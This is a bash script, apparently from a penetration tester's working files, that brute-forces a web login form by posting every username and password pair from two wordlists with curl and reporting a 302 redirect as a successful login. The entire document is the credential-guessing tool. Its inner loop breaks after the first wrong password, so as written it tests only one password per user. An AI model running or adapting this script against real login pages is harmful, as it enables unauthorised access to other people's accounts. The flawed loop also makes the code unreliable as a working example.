#!/bin/bash
url="http://192.168.1.7/login.php"
userlist="/home/knx/pentest/password/NT_user.dic"
passlist="/home/knx/pentest/password/common.txt"

for user in `cat $userlist`; do
  for pass in `cat $passlist`; do
    http_code=$(curl -L --data-urlencode  username="$user" --data-urlencode password="$pass" "$url" -w '%{http_code}' -o /dev/null -s)
    if [[ $http_code -eq 302 ]]; then
      echo "Success: User: '$user' Pass: '$pass'"
      break 2
    else 
	  echo "WRONG: User: '$user' Pass: '$pass'"
	  break 
    fi
  done
done
